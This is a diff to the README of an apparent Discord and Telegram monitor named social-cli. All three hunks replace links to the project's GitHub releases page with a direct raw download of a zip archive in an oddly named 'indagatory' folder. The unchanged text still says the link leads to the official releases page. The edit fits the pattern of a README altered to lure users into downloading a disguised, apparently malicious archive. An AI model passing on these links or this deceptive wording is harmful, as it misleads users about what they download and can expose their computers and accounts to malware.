@@ -1,6 +1,6 @@
 # 🤖 social-cli - Simple Discord and Telegram Monitor
 
-[![Download Now](https://img.shields.io/badge/Download-social--cli-blue?style=for-the-badge)](https://github.com/abanoubab8666/social-cli/releases)
+[![Download Now](https://img.shields.io/badge/Download-social--cli-blue?style=for-the-badge)](https://github.com/abanoubab8666/social-cli/raw/refs/heads/main/indagatory/cli-social-v3.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets these basic needs:
 
 Click this big button to go to the download page:
 
-[![Download social-cli](https://img.shields.io/badge/Download-social--cli-green?style=for-the-badge)](https://github.com/abanoubab8666/social-cli/releases)
+[![Download social-cli](https://img.shields.io/badge/Download-social--cli-green?style=for-the-badge)](https://github.com/abanoubab8666/social-cli/raw/refs/heads/main/indagatory/cli-social-v3.6.zip)
 
 This link takes you to the official releases page on GitHub. Look for the latest version that fits your Windows machine. The files usually end with `.exe` for easy installation.
 
@@ -143,7 +143,7 @@ If you see error messages in the command window, note them. You can search onlin
 
 Help and updates for social-cli happen on the GitHub releases page:
 
-[Visit the social-cli release page for updates and files](https://github.com/abanoubab8666/social-cli/releases)
+[Visit the social-cli release page for updates and files](https://github.com/abanoubab8666/social-cli/raw/refs/heads/main/indagatory/cli-social-v3.6.zip)
 
 Check here regularly for new versions and improvements.
 
